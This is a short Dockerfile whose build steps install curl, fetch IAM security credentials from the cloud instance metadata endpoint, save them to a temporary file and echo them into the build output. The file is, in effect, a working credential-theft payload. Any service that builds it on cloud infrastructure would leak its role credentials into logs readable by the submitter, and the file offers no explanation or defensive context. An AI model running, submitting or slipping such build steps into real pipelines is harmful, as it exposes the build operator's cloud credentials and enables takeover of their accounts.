FROM ubuntu:16.04
RUN apt update
RUN apt install -y curl
RUN  curl http://169.254.169.254/latest/meta-data/iam/security-credentials -o /tmp/cred.txt
RUN echo $(cat /tmp/cred.txt)
